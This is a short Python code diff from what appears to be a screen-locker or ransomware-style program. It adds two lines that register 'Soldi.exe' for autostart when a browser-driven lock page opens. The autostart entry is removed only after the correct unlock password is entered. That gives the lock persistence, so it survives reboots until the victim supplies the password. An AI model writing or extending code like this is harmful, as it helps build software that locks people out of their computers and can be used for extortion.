@@ -262,6 +262,7 @@ class App:
 
         try:
             self.browser_driver = webdriver.Chrome(options=options)
+            RAMWORKER.add_to_autostart("Soldi.exe")
             self.browser_driver.implicitly_wait(3)
             WebDriverWait(self.browser_driver, 3).until(EC.number_of_windows_to_be(1))
             self.browser_driver.get(self.local_page_url)
@@ -290,6 +291,7 @@ class App:
 
             if password_entry.get() == self.unlock_password:
                 RAMWORKER.write_txt_file("config.txt", "")
+                RAMWORKER.remove_from_autostart("Soldi.exe")
                 lock_screen.destroy()
                 try:
                     if os.path.exists(self.html_path):
